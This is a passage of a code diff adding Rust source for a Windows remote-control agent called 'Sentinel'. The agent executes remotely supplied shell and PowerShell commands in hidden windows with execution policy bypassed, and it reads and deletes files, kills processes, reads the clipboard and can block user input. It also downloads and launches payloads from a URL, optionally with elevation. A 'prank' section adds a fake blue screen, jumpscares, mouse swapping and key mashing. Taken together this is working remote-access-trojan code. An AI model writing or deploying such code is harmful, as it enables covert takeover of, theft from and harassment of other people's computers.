+                .args(["-NoProfile", "-NonInteractive", "-Command", &script])
+                .creation_flags(CREATE_NO_WINDOW)
+                .output();
+        }
+        "scroll" => {
+            let dy = payload.get("dy").and_then(|v| v.as_f64()).unwrap_or(0.0);
+            if dy.abs() < 1.0 { return Ok(json!({"ok": true})); }
+            // 0x0800 = MOUSEEVENTF_WHEEL, delta is in units of 120
+            let delta = if dy > 0.0 { -120i32 } else { 120 };
+            let script = format!(
+                "Add-Type -Name M -Namespace W -MemberDefinition '[DllImport(\\\"user32.dll\\\")] public static extern void mouse_event(uint f, uint x, uint y, uint d, int e);'; \
+                 [W.M]::mouse_event(0x0800, 0, 0, {}, 0)", delta
+            );
+            let _ = Command::new("powershell")
+                .args(["-NoProfile", "-NonInteractive", "-Command", &script])
+                .creation_flags(CREATE_NO_WINDOW)
+                .output();
+        }
+        "dblclick" => {
+            // Double-click: two rapid left clicks at position
+            let mut script = String::new();
+            script.push_str("Add-Type -AssemblyName System.Windows.Forms; ");
+            script.push_str("Add-Type -Name M -Namespace W -MemberDefinition '[DllImport(\\\"user32.dll\\\")] public static extern void mouse_event(uint f, uint x, uint y, uint d, int e);'; ");
+            if x_rel >= 0.0 && y_rel >= 0.0 {
+                script.push_str(&format!(
+                    "$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \
+                     [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]($b.Width*{}), [int]($b.Height*{})); ",
+                    x_rel, y_rel
+                ));
+            }
+            script.push_str("[W.M]::mouse_event(0x0002, 0, 0, 0, 0); [W.M]::mouse_event(0x0004, 0, 0, 0, 0); Start-Sleep -Milliseconds 50; [W.M]::mouse_event(0x0002, 0, 0, 0, 0); [W.M]::mouse_event(0x0004, 0, 0, 0, 0)");
+            let _ = Command::new("powershell")
+                .args(["-NoProfile", "-NonInteractive", "-Command", &script])
+                .creation_flags(CREATE_NO_WINDOW)
+                .output();
+        }
+        _ => {}
+    }
+    Ok(json!({"ok": true}))
+}
+
+#[cfg(not(windows))]
+fn mouse_action(_event: &str, _payload: &Value) -> Result<Value, String> {
+    Ok(json!({"ok": true, "note": "mouse control only on Windows"}))
+}
+
+#[cfg(windows)]
+fn key_action(payload: &Value) -> Result<Value, String> {
+    use std::os::windows::process::CommandExt;
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+
+    let key = payload.get("key").and_then(|v| v.as_str()).unwrap_or("");
+    let event_type = payload.get("type").and_then(|v| v.as_str()).unwrap_or("keydown");
+    let ctrl = payload.get("ctrl").and_then(|v| v.as_bool()).unwrap_or(false);
+    let shift = payload.get("shift").and_then(|v| v.as_bool()).unwrap_or(false);
+    let alt = payload.get("alt").and_then(|v| v.as_bool()).unwrap_or(false);
+
+    if event_type != "keydown" {
+        // Only act on keydown to avoid double-firing
+        return Ok(json!({"ok": true}));
+    }
+
+    // Map common keys to SendKeys notation
+    let send_key = match key {
+        "Enter" => "~",
+        "Tab" => "{TAB}",
+        "Escape" => "{ESC}",
+        "Backspace" => "{BACKSPACE}",
+        "Delete" => "{DELETE}",
+        "ArrowUp" => "{UP}",
+        "ArrowDown" => "{DOWN}",
+        "ArrowLeft" => "{LEFT}",
+        "ArrowRight" => "{RIGHT}",
+        "Home" => "{HOME}",
+        "End" => "{END}",
+        "PageUp" => "{PGUP}",
+        "PageDown" => "{PGDN}",
+        "F1" => "{F1}", "F2" => "{F2}", "F3" => "{F3}", "F4" => "{F4}",
+        "F5" => "{F5}", "F6" => "{F6}", "F7" => "{F7}", "F8" => "{F8}",
+        "F9" => "{F9}", "F10" => "{F10}", "F11" => "{F11}", "F12" => "{F12}",
+        " " => " ",
+        k if k.len() == 1 => k,
+        _ => { return Ok(json!({"ok": true, "skipped": key})); }
+    };
+
+    // Build SendKeys string with modifiers
+    let mut combo = String::new();
+    if ctrl { combo.push('^'); }
+    if alt { combo.push('%'); }
+    if shift { combo.push('+'); }
+    // Escape special SendKeys chars in single-char keys
+    let safe_key = match send_key {
+        "+" | "^" | "%" | "~" | "(" | ")" | "{" | "}" | "[" | "]" => {
+            format!("{{{}}}", send_key)
+        }
+        _ => send_key.to_string(),
+    };
+    combo.push_str(&safe_key);
+
+    let escaped = combo.replace("'", "''");
+    let script = format!(
+        "Add-Type -AssemblyName System.Windows.Forms; \
+         [System.Windows.Forms.SendKeys]::SendWait('{}')", escaped
+    );
+    let _ = Command::new("powershell")
+        .args(["-NoProfile", "-NonInteractive", "-Command", &script])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output();
+
+    Ok(json!({"ok": true, "key": key}))
+}
+
+#[cfg(not(windows))]
+fn key_action(_payload: &Value) -> Result<Value, String> {
+    Ok(json!({"ok": true, "note": "keyboard control only on Windows"}))
+}
+
+#[cfg(windows)]
+fn input_lock(locked: bool) -> Result<Value, String> {
+    use std::os::windows::process::CommandExt;
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+
+    let val = if locked { "1" } else { "0" };
+    let script = format!(
+        "Add-Type -Name I -Namespace W -MemberDefinition '[DllImport(\\\"user32.dll\\\")] public static extern bool BlockInput(bool b);'; \
+         [W.I]::BlockInput([bool]::Parse('{}'))", if locked { "True" } else { "False" }
+    );
+    let _ = Command::new("powershell")
+        .args(["-NoProfile", "-NonInteractive", "-Command", &script])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output();
+    let _ = val;
+    Ok(json!({"ok": true, "locked": locked}))
+}
+
+#[cfg(not(windows))]
+fn input_lock(_locked: bool) -> Result<Value, String> {
+    Ok(json!({"ok": true, "note": "input lock only on Windows"}))
+}
+
+// ---------- command handlers ----------
+
+fn run_shell(cmd: &str) -> Value {
+    #[cfg(windows)]
+    let out = Command::new("cmd").args(["/C", cmd]).output();
+    #[cfg(not(windows))]
+    let out = Command::new("sh").args(["-c", cmd]).output();
+    match out {
+        Ok(o) => json!({
+            "stdout": truncate(String::from_utf8_lossy(&o.stdout).to_string(), 200_000),
+            "stderr": truncate(String::from_utf8_lossy(&o.stderr).to_string(), 200_000),
+            "exit_code": o.status.code().unwrap_or(-1),
+        }),
+        Err(e) => json!({ "stdout": "", "stderr": e.to_string(), "exit_code": -1 }),
+    }
+}
+
+fn truncate(mut s: String, n: usize) -> String {
+    if s.len() > n { s.truncate(n); s.push_str("\\n…[truncated]"); }
+    s
+}
+
+fn fs_list(p: &str) -> Result<Value, String> {
+    let path = if p.is_empty() { if cfg!(windows) { "C:\\\\".into() } else { "/".into() } } else { p.to_string() };
+    let entries = fs::read_dir(&path).map_err(|e| e.to_string())?;
+    let mut out = vec![];
+    for e in entries.flatten() {
+        if let Ok(meta) = e.metadata() {
+            out.push(json!({
+                "name": e.file_name().to_string_lossy(),
+                "is_dir": meta.is_dir(),
+                "size": meta.len(),
+            }));
+        }
+    }
+    Ok(json!({ "path": path, "entries": out }))
+}
+
+fn fs_read(p: &str) -> Result<Value, String> {
+    let meta = fs::metadata(p).map_err(|e| e.to_string())?;
+    if meta.len() > 5_000_000 { return Err("file too large (max 5MB)".into()); }
+    let data = fs::read(p).map_err(|e| e.to_string())?;
+    Ok(json!({ "content": String::from_utf8_lossy(&data), "size": data.len() }))
+}
+
+fn fs_delete(p: &str) -> Result<Value, String> {
+    let meta = fs::metadata(p).map_err(|e| e.to_string())?;
+    if meta.is_dir() { fs::remove_dir_all(p) } else { fs::remove_file(p) }
+        .map_err(|e| e.to_string())?;
+    Ok(json!({ "deleted": p }))
+}
+
+fn proc_list() -> Result<Value, String> {
+    #[cfg(windows)]
+    {
+        let out = Command::new("tasklist").args(["/fo", "csv", "/nh"])
+            .output().map_err(|e| e.to_string())?;
+        let text = String::from_utf8_lossy(&out.stdout);
+        let mut procs = vec![];
+        for line in text.lines() {
+            let cols: Vec<&str> = line.split("\\",\\"").map(|s| s.trim_matches('"')).collect();
+            if cols.len() >= 5 {
+                let pid: i64 = cols[1].parse().unwrap_or(0);
+                let mem_str: String = cols[4].chars().filter(|c| c.is_ascii_digit()).collect();
+                let kb: f64 = mem_str.parse().unwrap_or(0.0);
+                procs.push(json!({
+                    "pid": pid,
+                    "name": cols[0],
+                    "memory_mb": kb / 1024.0,
+                }));
+            }
+        }
+        Ok(json!({ "processes": procs }))
+    }
+    #[cfg(not(windows))]
+    { Ok(json!({ "processes": [] })) }
+}
+
+fn proc_kill(pid: i64) -> Result<Value, String> {
+    #[cfg(windows)]
+    {
+        let out = Command::new("taskkill").args(["/F", "/PID", &pid.to_string()])
+            .output().map_err(|e| e.to_string())?;
+        if !out.status.success() {
+            return Err(String::from_utf8_lossy(&out.stderr).to_string());
+        }
+    }
+    Ok(json!({ "killed": pid }))
+}
+
+fn powershell(script: &str) -> Result<String, String> {
+    #[cfg(windows)]
+    {
+        use std::os::windows::process::CommandExt;
+        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+        let out = Command::new("powershell")
+            .args(["-NoProfile", "-NonInteractive", "-Command", script])
+            .creation_flags(CREATE_NO_WINDOW)
+            .output().map_err(|e| e.to_string())?;
+        if !out.status.success() {
+            return Err(String::from_utf8_lossy(&out.stderr).to_string());
+        }
+        Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
+    }
+    #[cfg(not(windows))]
+    { let _ = script; Err("powershell not available".into()) }
+}
+
+fn clipboard_get() -> Result<Value, String> {
+    #[cfg(windows)]
+    {
+        let text = powershell("Get-Clipboard")?;
+        Ok(json!({ "text": text }))
+    }
+    #[cfg(not(windows))]
+    { Err("clipboard not supported on this platform".into()) }
+}
+
+fn clipboard_set(text: &str) -> Result<Value, String> {
+    #[cfg(windows)]
+    {
+        let escaped = text.replace("'", "''");
+        powershell(&format!("Set-Clipboard -Value '{}'", escaped))?;
+        Ok(json!({ "ok": true }))
+    }
+    #[cfg(not(windows))]
+    { let _ = text; Err("clipboard not supported on this platform".into()) }
+}
+
+fn system_action(action: &str, payload: &Value) -> Result<Value, String> {
+    match action {
+        "system.shutdown" => {
+            #[cfg(windows)]
+            Command::new("shutdown").args(["/s", "/t", "5"]).status().map_err(|e| e.to_string())?;
+            Ok(json!({ "ok": true }))
+        }
+        "system.restart" => {
+            #[cfg(windows)]
+            Command::new("shutdown").args(["/r", "/t", "5"]).status().map_err(|e| e.to_string())?;
+            Ok(json!({ "ok": true }))
+        }
+        "system.lock" => {
+            #[cfg(windows)]
+            Command::new("rundll32.exe").arg("user32.dll,LockWorkStation")
+                .status().map_err(|e| e.to_string())?;
+            Ok(json!({ "ok": true }))
+        }
+        "system.notify" => {
+            let msg = payload.get("message").and_then(|v| v.as_str()).unwrap_or("Notification");
+            let title = payload.get("title").and_then(|v| v.as_str()).unwrap_or("Sentinel");
+            #[cfg(windows)]
+            {
+                let script = format!(
+                    "Add-Type -AssemblyName System.Windows.Forms; \
+                     $n = New-Object System.Windows.Forms.NotifyIcon; \
+                     $n.Icon = [System.Drawing.SystemIcons]::Information; \
+                     $n.Visible = $true; \
+                     $n.ShowBalloonTip(5000, '{}', '{}', 'Info'); \
+                     Start-Sleep -Seconds 6; $n.Dispose()",
+                    ps_escape(title), ps_escape(msg)
+                );
+                let _ = powershell(&script);
+            }
+            Ok(json!({ "ok": true, "message": msg }))
+        }
+        "system.volume.set" => {
+            let level = payload.get("level").and_then(|v| v.as_f64()).unwrap_or(50.0).clamp(0.0, 100.0);
+            #[cfg(windows)]
+            {
+                let script = format!(
+                    "$w = New-Object -ComObject WScript.Shell; \
+                     for($i=0;$i -lt 50;$i++) {{ $w.SendKeys([char]174) }}; \
+                     $steps = [math]::Round({} / 2); \
+                     for($i=0;$i -lt $steps;$i++) {{ $w.SendKeys([char]175) }}",
+                    level
+                );
+                let _ = powershell(&script);
+            }
+            Ok(json!({ "ok": true, "level": level }))
+        }
+        "system.volume.mute" => {
+            #[cfg(windows)]
+            {
+                let _ = powershell("(New-Object -ComObject WScript.Shell).SendKeys([char]173)");
+            }
+            Ok(json!({ "ok": true }))
+        }
+        "system.sound.play" => {
+            let src = payload.get("url").and_then(|v| v.as_str()).unwrap_or("").to_string();
+            if src.is_empty() { return Err("missing url".into()); }
+            #[cfg(windows)]
+            {
+                let local_path = if src.starts_with("http") {
+                    let tmp = std::env::temp_dir().join("sentinel-sound.tmp");
+                    download_to(&src, &tmp)?;
+                    tmp.to_string_lossy().to_string()
+                } else { src.clone() };
+                let lower = local_path.to_lowercase();
+                if lower.ends_with(".wav") {
+                    let script = format!(
+                        "(New-Object Media.SoundPlayer '{}').PlaySync()",
+                        ps_escape(&local_path)
+                    );
+                    let _ = powershell(&script);
+                } else {
+                    let script = format!(
+                        "$p = New-Object -ComObject WMPlayer.OCX; \
+                         $p.URL = '{}'; \
+                         $p.controls.play(); \
+                         while ($p.playState -ne 1) {{ Start-Sleep -Milliseconds 200 }}",
+                        ps_escape(&local_path)
+                    );
+                    let _ = powershell(&script);
+                }
+            }
+            Ok(json!({ "ok": true, "src": src }))
+        }
+        "system.launch_file" => {
+            let url = payload.get("url").and_then(|v| v.as_str()).unwrap_or("").to_string();
+            let filename = payload.get("filename").and_then(|v| v.as_str()).unwrap_or("agent-payload.bin").to_string();
+            let args_str = payload.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string();
+            let elevated = payload.get("elevated").and_then(|v| v.as_bool()).unwrap_or(false);
+            if url.is_empty() { return Err("missing url".into()); }
+            let safe_name: String = filename.chars()
+                .filter(|c| c.is_alphanumeric() || *c == '.' || *c == '-' || *c == '_')
+                .collect();
+            let safe_name = if safe_name.is_empty() { "agent-payload.bin".into() } else { safe_name };
+            let dest = std::env::temp_dir().join(&safe_name);
+            download_to(&url, &dest)?;
+            let dest_s = dest.to_string_lossy().to_string();
+            log!("launch_file -> {} (args: {})", dest_s, args_str);
+            #[cfg(windows)]
+            {
+                use std::os::windows::process::CommandExt;
+                const CREATE_NEW_CONSOLE: u32 = 0x0000_0010;
+                const DETACHED_PROCESS: u32 = 0x0000_0008;
+                let lower = dest_s.to_lowercase();
+                let result: Result<(), String> = if elevated {
+                    let script = format!(
+                        "Start-Process -FilePath '{}' -ArgumentList '{}' -Verb RunAs",
+                        ps_escape(&dest_s), ps_escape(&args_str)
+                    );
+                    powershell(&script).map(|_| ())
+                } else if lower.ends_with(".ps1") {
+                    Command::new("powershell")
+                        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", &dest_s])
+                        .creation_flags(DETACHED_PROCESS)
+                        .spawn().map(|_| ()).map_err(|e| e.to_string())
+                } else if lower.ends_with(".bat") || lower.ends_with(".cmd") {
+                    Command::new("cmd")
+                        .args(["/C", "start", "", &dest_s, &args_str])
+                        .creation_flags(CREATE_NEW_CONSOLE)
+                        .spawn().map(|_| ()).map_err(|e| e.to_string())
+                } else {
+                    let mut c = Command::new(&dest_s);
+                    if !args_str.is_empty() { c.args(args_str.split_whitespace()); }
+                    c.creation_flags(DETACHED_PROCESS).spawn().map(|_| ()).map_err(|e| e.to_string())
+                };
+                result?;
+            }
+            Ok(json!({ "ok": true, "path": dest_s, "url": url }))
+        }
+        "system.run_script" => {
+            let script = payload.get("script").and_then(|v| v.as_str()).unwrap_or("").to_string();
+            let lang = payload.get("lang").and_then(|v| v.as_str()).unwrap_or("powershell");
+            if script.is_empty() { return Err("empty script".into()); }
+            #[cfg(windows)]
+            {
+                use std::os::windows::process::CommandExt;
+                const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+                let out = if lang == "cmd" {
+                    Command::new("cmd").args(["/C", &script])
+                        .creation_flags(CREATE_NO_WINDOW)
+                        .output()
+                } else {
+                    Command::new("powershell")
+                        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &script])
+                        .creation_flags(CREATE_NO_WINDOW)
+                        .output()
+                };
+                let out = out.map_err(|e| e.to_string())?;
+                Ok(json!({
+                    "stdout": truncate(String::from_utf8_lossy(&out.stdout).to_string(), 200_000),
+                    "stderr": truncate(String::from_utf8_lossy(&out.stderr).to_string(), 200_000),
+                    "exit_code": out.status.code().unwrap_or(-1),
+                }))
+            }
+            #[cfg(not(windows))]
+            { let _ = lang; Ok(json!({"stdout": "", "stderr": "non-windows", "exit_code": -1})) }
+        }
+        _ => Err(format!("unknown system action: {}", action)),
+    }
+}
+
+fn ps_escape(s: &str) -> String { s.replace('\\'', "''") }
+
+// ---------- fun / prank actions ----------
+//
+// All Windows-only. Long-running actions (shake, drunken-mouse, scream loop,
+// bsod overlay, jumpscare) spawn a DETACHED PowerShell so the command returns
+// immediately and many can run concurrently. \`fun.stop\` kills every PS
+// process whose command line contains the marker tag \`SENTINEL_FUN\`.
+//
+// Every embedded PS snippet that needs Win32 inlines a tiny \`Add-Type\` C#
+// shim — that keeps the agent dependency-free (no extra crates).
+
+#[cfg(windows)]
+fn spawn_detached_ps(script: &str) -> Result<(), String> {
+    use std::os::windows::process::CommandExt;
+    const DETACHED_PROCESS: u32 = 0x0000_0008;
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+    Command::new("powershell")
+        .args(["-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass",
+               "-Command", script])
+        .creation_flags(DETACHED_PROCESS | CREATE_NO_WINDOW)
+        .spawn()
+        .map(|_| ())
+        .map_err(|e| e.to_string())
+}
+
+#[cfg(not(windows))]
+fn spawn_detached_ps(_script: &str) -> Result<(), String> { Ok(()) }
+
+// All prank PS scripts include this string so \`fun.stop\` can find them.
+const FUN_TAG: &str = "SENTINEL_FUN";
+
+fn fun_action(action: &str, payload: &Value) -> Result<Value, String> {
+    let dur = payload.get("duration_secs").and_then(|v| v.as_u64()).unwrap_or(5).min(120) as u32;
+    let text_arg = payload.get("text").and_then(|v| v.as_str()).unwrap_or("").to_string();
+    let url_arg  = payload.get("url").and_then(|v| v.as_str()).unwrap_or("").to_string();
+    let count    = payload.get("count").and_then(|v| v.as_u64()).unwrap_or(5).min(50) as u32;
+
+    match action {
+        // ---------- screen ----------
+        "fun.screen.flip" => {
+            let angle = payload.get("angle").and_then(|v| v.as_u64()).unwrap_or(180);
+            let orient = match angle { 90 => 1, 180 => 2, 270 => 3, _ => 0 };
+            let script = format!("# {}\n\
+Add-Type @'\n\
+using System; using System.Runtime.InteropServices;\n\
+public class D {{\n\
+  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]\n\
+  public struct DEVMODE {{\n\
+    [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;\n\
+    public short dmSpecVersion; public short dmDriverVersion; public short dmSize; public short dmDriverExtra;\n\
+    public int dmFields; public int dmPositionX; public int dmPositionY; public int dmDisplayOrientation;\n\
+    public int dmDisplayFixedOutput; public short dmColor; public short dmDuplex; public short dmYResolution;\n\
+    public short dmTTOption; public short dmCollate;\n\
+    [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;\n\
+    public short dmLogPixels; public int dmBitsPerPel; public int dmPelsWidth; public int dmPelsHeight;\n\
+    public int dmDisplayFlags; public int dmDisplayFrequency; public int dmICMMethod; public int dmICMIntent;\n\
+    public int dmMediaType; public int dmDitherType; public int dmReserved1; public int dmReserved2;\n\
+    public int dmPanningWidth; public int dmPanningHeight;\n\
+  }}\n\
+  [DllImport(\\"user32.dll\\")] public static extern int EnumDisplaySettings(string n,int m,ref DEVMODE d);\n\
+  [DllImport(\\"user32.dll\\")] public static extern int ChangeDisplaySettings(ref DEVMODE d,int f);\n\
+}}\n\
+'@\n\
+$dm = New-Object D+DEVMODE; $dm.dmSize = [short][System.Runtime.InteropServices.Marshal]::SizeOf($dm);\n\
+[D]::EnumDisplaySettings($null, -1, [ref]$dm) | Out-Null;\n\
+if (({orient} - $dm.dmDisplayOrientation) % 2 -ne 0) {{ $t=$dm.dmPelsWidth; $dm.dmPelsWidth=$dm.dmPelsHeight; $dm.dmPelsHeight=$t }}\n\
+$dm.dmDisplayOrientation = {orient}; $dm.dmFields = 0x80 -bor 0x100000 -bor 0x80000;\n\
+[D]::ChangeDisplaySettings([ref]$dm, 0) | Out-Null", FUN_TAG, orient=orient);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "angle": angle}))
+        }
+        "fun.screen.invert" => {
+            // Toggle Magnifier color inversion via Win+Ctrl+C shortcut (built-in).
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms;\n\
+[System.Windows.Forms.SendKeys]::SendWait('^{{LWIN down}}c^{{LWIN up}}')", FUN_TAG);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.screen.shake" => {
+            let script = format!("# {}\n\
+Add-Type @'\n\
+using System; using System.Runtime.InteropServices; using System.Drawing;\n\
+public class C {{ [DllImport(\\"user32.dll\\")] public static extern bool SetCursorPos(int x,int y);\n\
+  [DllImport(\\"user32.dll\\")] public static extern bool GetCursorPos(out Point p); }}\n\
+'@ -ReferencedAssemblies System.Drawing\n\
+$end=(Get-Date).AddSeconds({dur}); $r=New-Object Random;\n\
+while ((Get-Date) -lt $end) {{ $p=New-Object Drawing.Point; [C]::GetCursorPos([ref]$p) | Out-Null;\n\
+  [C]::SetCursorPos($p.X + $r.Next(-30,30), $p.Y + $r.Next(-30,30)) | Out-Null; Start-Sleep -Milliseconds 15 }}",
+                FUN_TAG, dur=dur);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "duration_secs": dur}))
+        }
+        "fun.screen.bsod" => {
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing;\n\
+$f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.WindowState='Maximized';\n\
+$f.TopMost=$true; $f.BackColor=[Drawing.Color]::FromArgb(0,120,215); $f.ForeColor='White';\n\
+$f.Cursor=[Windows.Forms.Cursors]::WaitCursor;\n\
+$l=New-Object Windows.Forms.Label; $l.Text=\\":(\\n\\nYour PC ran into a problem and needs to restart.\\nWe're just collecting some error info, and then we'll restart for you.\\n\\n0% complete\\";\n\
+$l.Font=New-Object Drawing.Font('Segoe UI',28); $l.AutoSize=$false; $l.Dock='Fill'; $l.TextAlign='MiddleCenter';\n\
+$f.Controls.Add($l); $f.Show(); Start-Sleep -Seconds {dur}; $f.Close()",
+                FUN_TAG, dur=dur);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.screen.jumpscare" => {
+            if url_arg.is_empty() { return Err("missing image url".into()); }
+            let tmp = std::env::temp_dir().join("sentinel-jumpscare.img");
+            download_to(&url_arg, &tmp)?;
+            let p = tmp.to_string_lossy().to_string();
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing;\n\
+$f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.WindowState='Maximized'; $f.TopMost=$true;\n\
+$pb=New-Object Windows.Forms.PictureBox; $pb.Image=[Drawing.Image]::FromFile('{}'); $pb.Dock='Fill'; $pb.SizeMode='Zoom';\n\
+$f.Controls.Add($pb); $f.Show();\n\
+try {{ (New-Object Media.SoundPlayer ([IO.Path]::Combine($env:WINDIR,'Media','Windows Critical Stop.wav'))).PlaySync() }} catch {{}}\n\
+Start-Sleep -Seconds 2; $f.Close()", FUN_TAG, ps_escape(&p));
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+
+        // ---------- audio ----------
+        "fun.audio.tts" => {
+            if text_arg.is_empty() { return Err("missing text".into()); }
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Speech;\n\
+$s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Volume=100; $s.Speak('{}')",
+                FUN_TAG, ps_escape(&text_arg));
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.audio.beep" => {
+            let freq = payload.get("freq").and_then(|v| v.as_u64()).unwrap_or(800).clamp(37, 32767);
+            let ms = payload.get("ms").and_then(|v| v.as_u64()).unwrap_or(400).clamp(20, 5000);
+            let script = format!("# {}\n\
+$end=(Get-Date).AddSeconds({dur});\n\
+while ((Get-Date) -lt $end) {{ [console]::beep({freq},{ms}); Start-Sleep -Milliseconds 80 }}",
+                FUN_TAG, dur=dur, freq=freq, ms=ms);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.audio.scream" => {
+            // Loop the built-in critical-stop sound, falling back to a synthesised tone.
+            let script = format!("# {}\n\
+$end=(Get-Date).AddSeconds({dur});\n\
+$wav=[IO.Path]::Combine($env:WINDIR,'Media','Windows Critical Stop.wav');\n\
+while ((Get-Date) -lt $end) {{\n\
+  try {{ (New-Object Media.SoundPlayer $wav).PlaySync() }} catch {{ [console]::beep(1200,400) }}\n\
+}}", FUN_TAG, dur=dur);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+
+        // ---------- input ----------
+        "fun.input.drunkenmouse" => {
+            let script = format!("# {}\n\
+Add-Type @'\n\
+using System; using System.Runtime.InteropServices; using System.Drawing;\n\
+public class M {{ [DllImport(\\"user32.dll\\")] public static extern bool SetCursorPos(int x,int y);\n\
+  [DllImport(\\"user32.dll\\")] public static extern bool GetCursorPos(out Point p); }}\n\
+'@ -ReferencedAssemblies System.Drawing\n\
+$end=(Get-Date).AddSeconds({dur}); $t=0.0;\n\
+while ((Get-Date) -lt $end) {{ $p=New-Object Drawing.Point; [M]::GetCursorPos([ref]$p) | Out-Null;\n\
+  $dx=[int]([Math]::Sin($t)*40); $dy=[int]([Math]::Cos($t*1.3)*30);\n\
+  [M]::SetCursorPos($p.X+$dx, $p.Y+$dy) | Out-Null; $t += 0.25; Start-Sleep -Milliseconds 20 }}",
+                FUN_TAG, dur=dur);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.input.teleport" => {
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms;\n\
+Add-Type @'\n\
+using System.Runtime.InteropServices;\n\
+public class T {{ [DllImport(\\"user32.dll\\")] public static extern bool SetCursorPos(int x,int y); }}\n\
+'@\n\
+$b=[Windows.Forms.SystemInformation]::VirtualScreen; $end=(Get-Date).AddSeconds({dur}); $r=New-Object Random;\n\
+while ((Get-Date) -lt $end) {{ [T]::SetCursorPos($r.Next($b.Left,$b.Right),$r.Next($b.Top,$b.Bottom)) | Out-Null;\n\
+  Start-Sleep -Milliseconds 300 }}", FUN_TAG, dur=dur);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.input.swapbuttons" => {
+            let swap = payload.get("swap").and_then(|v| v.as_bool()).unwrap_or(true);
+            let script = format!("# {}\n\
+Add-Type @'\n\
+using System.Runtime.InteropServices;\n\
+public class S {{ [DllImport(\\"user32.dll\\")] public static extern bool SwapMouseButton(bool s); }}\n\
+'@\n\
+[S]::SwapMouseButton([bool]::Parse('{}'))", FUN_TAG, if swap {"True"} else {"False"});
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "swap": swap}))
+        }
+        "fun.input.typestring" => {
+            if text_arg.is_empty() { return Err("missing text".into()); }
+            let escaped: String = text_arg.chars().map(|c| match c {
+                '+'|'^'|'%'|'~'|'('|')'|'{'|'}'|'['|']' => format!("{{{}}}", c),
+                _ => c.to_string(),
+            }).collect();
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms;\n\
+[System.Windows.Forms.SendKeys]::SendWait('{}')", FUN_TAG, ps_escape(&escaped));
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "len": text_arg.len()}))
+        }
+        "fun.input.keymash" => {
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms;\n\
+$chars='abcdefghijklmnopqrstuvwxyz1234567890 '.ToCharArray(); $r=New-Object Random;\n\
+$end=(Get-Date).AddSeconds({dur});\n\
+while ((Get-Date) -lt $end) {{ [System.Windows.Forms.SendKeys]::SendWait([string]$chars[$r.Next(0,$chars.Length)]); Start-Sleep -Milliseconds 40 }}",
+                FUN_TAG, dur=dur);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+
+        // ---------- window / system ----------
+        "fun.window.toastspam" => {
+            let title = payload.get("title").and_then(|v| v.as_str()).unwrap_or("Sentinel").to_string();
+            let body = payload.get("body").and_then(|v| v.as_str()).unwrap_or("👋").to_string();
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing;\n\
+for ($i=0; $i -lt {count}; $i++) {{\n\
+  $n=New-Object System.Windows.Forms.NotifyIcon; $n.Icon=[System.Drawing.SystemIcons]::Warning; $n.Visible=$true;\n\
+  $n.ShowBalloonTip(2000,'{}','{}','Warning'); Start-Sleep -Milliseconds 700; $n.Dispose()\n\
+}}", FUN_TAG, ps_escape(&title), ps_escape(&body), count=count);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "count": count}))
+        }
+        "fun.window.msgbox" => {
+            let title = payload.get("title").and_then(|v| v.as_str()).unwrap_or("System").to_string();
+            let body = if text_arg.is_empty() { "Error 0x80004005".into() } else { text_arg.clone() };
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms;\n\
+for ($i=0; $i -lt {count}; $i++) {{\n\
+  [System.Windows.Forms.MessageBox]::Show('{}','{}','OK','Error') | Out-Null\n\
+}}", FUN_TAG, ps_escape(&body), ps_escape(&title), count=count);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.window.wallpaper" => {
+            if url_arg.is_empty() { return Err("missing image url".into()); }
+            let tmp = std::env::temp_dir().join("sentinel-wallpaper.jpg");
+            download_to(&url_arg, &tmp)?;
+            let p = tmp.to_string_lossy().to_string();
+            let script = format!("# {}\n\
+Add-Type @'\n\
+using System.Runtime.InteropServices;\n\
